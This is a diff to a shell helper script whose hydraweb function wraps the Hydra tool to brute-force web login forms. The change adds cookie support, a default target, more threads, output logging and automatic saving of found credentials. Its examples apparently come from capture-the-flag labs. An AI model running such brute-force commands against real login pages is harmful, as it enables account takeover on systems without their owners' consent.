@@ -2,41 +2,80 @@
 # hydra helpers
 # ========================
 
+_hydraweb-usage() {
+  echo "usage:"
+  echo "  hydraweb [target] <path> <user> <F|S> <text> <user_field> [pass_field] [extra_post] [cookie]"
+  echo "  omit target when \$IP is set (ta <ip>)"
+  echo "  cookie: sent as H=Cookie: ... (e.g. PHPSESSID=abc; security=low)"
+  echo
+  echo "examples:"
+  echo "  hydraweb /login.php Rick F \"Invalid username or password\" username password"
+  echo "  hydraweb /login.php admin F \"failed\" username password sub=Login \"PHPSESSID=abc; security=low\""
+  echo "  hydraweb 10.10.10.10 /login.php R1ckR0n43 S \"ingredient\" username password \"sub=Login\""
+  echo
+  echo "extra_post default: sub=Login  (matches login.php submit button)"
+  echo "  on hit: creds saved to cl (creds-import-hydra)"
+}
+
 hydraweb() {
-  if [[ $# -lt 6 ]]; then
-    echo "usage:"
-    echo "  hydraweb <target> <path> <user> <F|S> <text> <user_field> [pass_field] [extra_post]"
-    echo
-    echo "examples:"
-    echo "  hydraweb 10.10.10.10 /login.php Rick F \"Invalid username or password\" username password"
-    echo "  hydraweb 10.10.10.10 /login.php R1ckR0n43 S \"ingredient\" username password \"sub=Login\""
-    echo
-    echo "extra_post default: sub=Login  (matches login.php submit button)"
-    return 1
+  local target path user mode text userfield passfield extra_post cookie form
+
+  if [[ $# -ge 1 && "$1" =~ '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' ]]; then
+    if [[ $# -lt 6 ]]; then
+      _hydraweb-usage
+      return 1
+    fi
+    target="$1"
+    shift
+  else
+    if [[ $# -lt 5 ]]; then
+      _hydraweb-usage
+      return 1
+    fi
+    target="${IP:-}"
+    if [[ -z "$target" ]]; then
+      echo "no target: ta <ip> or pass IP as first arg" >&2
+      return 1
+    fi
   fi
 
-  local target="$1"
-  local path="$2"
-  local user="$3"
-  local mode="$4"
-  local text="$5"
-  local userfield="$6"
-  local passfield="${7:-password}"
-  local extra_post="${8:-sub=Login}"
+  path="$1"
+  user="$2"
+  mode="$3"
+  text="$4"
+  userfield="$5"
+  passfield="${6:-password}"
+  extra_post="${7:-sub=Login}"
+  cookie="${8:-}"
 
-  local form="${path}:${userfield}=^USER^&${passfield}=^PASS^"
+  form="${path}:${userfield}=^USER^&${passfield}=^PASS^"
   if [[ -n "$extra_post" ]]; then
     form="${form}&${extra_post}"
+  fi
+  if [[ -n "$cookie" ]]; then
+    form="${form}:H=Cookie: ${cookie}"
   fi
   form="${form}:${mode}=${text}"
 
   echo "[*] hydra form: ${form}"
+  [[ -n "$cookie" ]] && echo "[*] cookie: ${cookie}"
+  echo "[*] target: http://$target  user: $user"
+  echo "[*] wordlist: $RECON_PASSLIST"
+
+  local log rc
+  log="$(mktemp "${TMPDIR:-/tmp}/hydraweb.XXXXXX")"
+  trap 'rm -f "$log"' EXIT INT TERM
 
   /usr/bin/hydra -l "$user" \
     -P "$RECON_PASSLIST" \
-    -t 16 -f -V \
+    -t 32 -f -V \
     "$target" http-post-form \
-    "$form"
+    "$form" 2>&1 | tee "$log"
+  rc=${pipestatus[1]}
+
+  python3 "$RECON_APP" creds-import-hydra "$target" --file "$log"
+
+  return $rc
 }
 
 # usage: _hydra-parse-args <default_user> [args...]
